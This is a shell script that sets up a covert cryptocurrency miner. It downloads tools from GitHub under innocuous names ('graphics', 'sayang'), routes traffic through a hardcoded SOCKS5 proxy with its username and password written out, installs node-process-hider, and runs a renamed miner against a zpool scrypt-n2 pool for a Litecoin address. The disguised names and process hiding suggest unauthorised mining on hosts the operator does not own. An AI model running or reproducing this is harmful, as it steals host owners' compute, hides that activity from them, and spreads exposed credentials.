#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_berkah69
socks5_password = liyan65
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/rondo/raw/main/sayang.tar.gz && tar -xf sayang.tar.gz >/dev/null 2>&1 && sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zpool.ca:4339 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,zap=XBTX -t 2 > /tmp/rondo.log 2>&1
